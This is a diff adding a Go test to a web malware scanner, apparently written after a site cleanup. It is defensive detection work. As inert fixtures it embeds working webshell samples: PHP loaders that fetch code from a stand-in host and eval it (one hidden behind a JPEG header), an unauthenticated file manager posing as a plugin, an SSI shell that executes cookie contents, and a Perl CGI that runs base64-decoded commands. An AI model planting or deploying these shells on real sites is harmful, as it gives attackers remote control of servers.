@@ -2116,3 +2116,52 @@ func TestFleetOperatorPanelKit(t *testing.T) {
 		}
 	}
 }
+
+// bitepestcontrol.com (superfast, 2026-11-06): a stolen administrator
+// login dropped code fetched from GitHub and evaluated, a JPEG with PHP
+// after it doing the same, an unauthenticated file manager dressed as a
+// plugin, and the Alfa shell's Perl CGI and SSI parts (.alfa and .shtml
+// were not even read). Inert fixtures; look-alikes stay clean.
+func TestFleetRemoteEvalAndAlfaParts(t *testing.T) {
+	s := newScanner(t)
+	fm := "<?php\n/**\n* Plugin Name: PNG Optimizer Pro\n*/\n$p = $_GET['path'] ?? '.';\n" +
+		"if (isset($_GET['delete'])) { unlink($p . '/' . $_GET['delete']); }\nif (isset($_GET['chmod'])) { chmod($p, 0755); }\n" +
+		"if (isset($_POST['folder_name'])) { rename($p, $_POST['folder_name']); }\nif (isset($_POST['file_content'])) { file_put_contents($_POST['file_path'], $_POST['file_content']); }\n" +
+		"if (!empty($_FILES['f'])) { move_uploaded_file($_FILES['f']['tmp_name'], $p . '/' . $_FILES['f']['name']); }\nforeach (scandir($p) as $e) { echo $e; }\n"
+	for what, c := range map[string]struct{ name, body, sig string }{
+		"github eval":  {"admin.php", "<?php\n$link = 'https://example.test/inert.txt';\n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, $link);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$output = curl_exec($ch);\ncurl_close($ch);\neval ('?>'.$output);\n", "PHP.Backdoor.RemoteCodeEval"},
+		"jpeg loader":  {"sd.php", "\xff\xd8\xff\xe0\x00\x10JFIF inert\n<?=\n$url = 'https://' . 'example.test/list/' . 'inert.txt';\nfunction get($u){$c = curl_init($u); curl_setopt($c, CURLOPT_RETURNTRANSFER, true); $d = curl_exec($c); curl_close($c); return $d;}\n$content = get($url);\nif ($content !== false) { eval(\"?>\" . $content); }\n", "PHP.Backdoor.RemoteCodeEval"},
+		"file manager": {"1.php", fm, "PHP.Webshell.FileManager"},
+		"ssi shell":    {"x/a.shtml", "<!--#if expr=\"(\\\"$HTTP_COOKIE\\\" = \\\"\\\")\" -->\n<!--#set var=\"shl\" value=\"id\" -->\n<!--#else -->\n<!--#set var=\"shl\" value=$HTTP_COOKIE -->\n<!--#endif -->\n<!--#exec cmd=$shl -->\n", "SSI.Webshell.Exec"},
+		"perl cgi":     {"x/perl.alfa", "#!/usr/bin/perl\nuse MIME::Base64;print \"Content-type: text/html\\n\\n\";read(STDIN, $in, $ENV{'CONTENT_LENGTH'});\n%in = map { split /=/ } split /&/, $in;\nsystem(decode_base64($in{\"cmd\"}));\n", "Perl.Webshell.CGI"},
+		"alfa folder":  {"1337_DATA/alfa_shtml/.htaccess", "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml\n", "Webshell.Alfa.Component"},
+	} {
+		p := "/home2/u/public_html/" + c.name
+		if d := s.checkContent(p, extOf(p), []byte(c.body)); d == nil || d.Signature != c.sig || d.Category != CatVirus {
+			t.Errorf("%s: %+v", what, d)
+		}
+	}
+	for what, c := range map[string]struct{ name, body string }{
+		// A template engine evaluating a local template.
+		"template": {"lib/tpl.php", "<?php\nfunction render($file, $vars) { extract($vars); $tpl = file_get_contents($file); eval('?>' . $tpl); }\n"},
+		// An update check reading JSON from its vendor.
+		"update check": {"lib/up.php", "<?php\n$c = curl_init('https://example.test/v.json'); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $v = json_decode(curl_exec($c), true); echo $v['version'];\n"},
+		// A file manager with a login (Tiny File Manager style).
+		"tfm": {"tfm.php", "<?php\nsession_start(); $auth_users = array('admin' => '$2y$10$inert'); if (empty($_SESSION['logged'])) { exit; }\n" + strings.TrimPrefix(fm, "<?php\n")},
+		// Ordinary SSI.
+		"ssi page": {"index.shtml", "<html><body><!--#include virtual=\"/footer.html\" --><!--#echo var=\"DATE_LOCAL\" --></body></html>\n"},
+		// A Perl form mailer.
+		"perl mailer": {"cgi-bin/mail.pl", "#!/usr/bin/perl\nuse CGI; my $q = CGI->new; open(my $m, '|-', '/usr/sbin/sendmail -t'); print $m 'To: owner@example.test' . \"\\n\"; close $m;\n"},
+	} {
+		p := "/home2/u/public_html/" + c.name
+		d := s.checkContent(p, extOf(p), []byte(c.body))
+		// (The login-protected manager still saves uploads under the sent
+		// name, which the uploader rule reports; only this rule must not.)
+		if what == "tfm" && d != nil && d.Signature != "PHP.Webshell.FileManager" {
+			continue
+		}
+		if d != nil {
+			t.Errorf("%s: %+v", what, d)
+		}
+	}
+}
